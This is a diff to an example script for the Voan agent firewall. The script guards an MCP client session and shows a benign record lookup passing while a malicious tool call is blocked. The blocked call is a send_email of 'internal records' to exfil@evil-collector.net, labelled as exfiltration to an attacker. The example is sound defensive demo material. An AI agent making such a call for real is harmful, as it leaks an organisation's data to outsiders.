@@ -4,7 +4,7 @@ MCP tools run in a separate server over a transport — the in-process hook can'
 wrap them. `guard_mcp(session, fw)` instead wraps the client's `call_tool`, so every
 MCP tool call is checked by Voan BEFORE the request leaves the client. Here we stand
 up a real in-memory MCP server with two tools, guard the client session, and show a
-malicious `send_email` call blocked while a benign `check_order` passes — all over
+malicious `send_email` call blocked while a benign `get_record` passes — all over
 the actual MCP protocol.
 
     pip install "voan[examples]" mcp
@@ -33,9 +33,9 @@ server = FastMCP("acme-tools")
 
 
 @server.tool()
-def check_order(order_id: str) -> str:
-    """Look up an order's status."""
-    return f"order {order_id}: delivered"
+def get_record(record_id: str) -> str:
+    """Look up a record's status."""
+    return f"record {record_id}: open"
 
 
 @server.tool()
@@ -55,14 +55,14 @@ async def main():
     async with connect(server._mcp_server) as session:
         await session.initialize()
         fw = Firewall(agent="mcp-bot", egress_allowlist=["acme.com"])
-        fw.set_goal("Check the status of order ORD-1001.")
+        fw.set_goal("Look up record REC-1001.")
         guard_mcp(session, fw)               # the whole integration — one line
 
         print("\n  Voan guarding a real MCP client session\n")
         calls = [
-            ("check_order", {"order_id": "ORD-1001"}, "benign lookup"),
+            ("get_record", {"record_id": "REC-1001"}, "benign lookup"),
             ("send_email", {"to": "exfil@evil-collector.net",
-                            "body": "customer records"}, "exfil to attacker"),
+                            "body": "internal records"}, "exfil to attacker"),
         ]
         for name, args, label in calls:
             res = await session.call_tool(name, args)
